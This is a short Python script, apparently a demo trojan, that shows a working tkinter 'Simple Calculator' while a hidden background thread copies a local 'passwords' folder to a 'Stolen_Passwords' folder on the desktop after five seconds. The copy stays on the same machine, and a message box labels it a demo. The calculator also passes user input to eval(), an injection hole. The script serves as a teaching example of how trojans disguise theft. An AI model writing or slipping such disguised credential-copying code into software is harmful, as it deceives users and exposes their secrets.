import tkinter as tk
from tkinter import messagebox
import shutil
import os
import threading
import time

# --- CONFIGURE THESE ---
FAKE_PASSWORDS_FOLDER = os.path.expanduser("C:\Users\Ruhaal\OneDrive\Documents\passwords")
STOLEN_FOLDER_DEST = os.path.expanduser("~/Desktop/Stolen_Passwords")

def steal_folder():
    try:
        if not os.path.exists(FAKE_PASSWORDS_FOLDER):
            print(f"[!] Folder to steal not found: {FAKE_PASSWORDS_FOLDER}")
            return

        os.makedirs(STOLEN_FOLDER_DEST, exist_ok=True)

        for item in os.listdir(FAKE_PASSWORDS_FOLDER):
            s = os.path.join(FAKE_PASSWORDS_FOLDER, item)
            d = os.path.join(STOLEN_FOLDER_DEST, item)
            if os.path.isdir(s):
                shutil.copytree(s, d, dirs_exist_ok=True)
            else:
                shutil.copy2(s, d)

        print(f"[+] Folder stolen successfully to {STOLEN_FOLDER_DEST}")
        messagebox.showinfo("Demo Complete", f"Fake data copied to:\n{STOLEN_FOLDER_DEST}")
    except Exception as e:
        print(f"[!] Error stealing folder: {e}")

def run_trojan_tasks():
    time.sleep(5)
    steal_folder()

class Calculator(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Simple Calculator")
        self.geometry("300x250")
        self.resizable(False, False)

        self.entry = tk.Entry(self, width=16, font=("Arial", 24), borderwidth=2, relief="ridge")
        self.entry.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

        buttons = [
            '7', '8', '9', '+',
            '4', '5', '6', '-',
            '1', '2', '3', '*',
            'C', '0', '=', '/'
        ]

        row_val = 1
        col_val = 0
        for b in buttons:
            action = lambda x=b: self.click(x)
            tk.Button(self, text=b, width=5, height=2, command=action).grid(row=row_val, column=col_val)
            col_val += 1
            if col_val > 3:
                col_val = 0
                row_val += 1

    def click(self, key):
        if key == 'C':
            self.entry.delete(0, tk.END)
        elif key == '=':
            try:
                result = eval(self.entry.get())
                self.entry.delete(0, tk.END)
                self.entry.insert(tk.END, str(result))
            except:
                self.entry.delete(0, tk.END)
                self.entry.insert(tk.END, "Error")
        else:
            self.entry.insert(tk.END, key)

if __name__ == "__main__":
    threading.Thread(target=run_trojan_tasks, daemon=True).start()
    app = Calculator()
    app.mainloop()

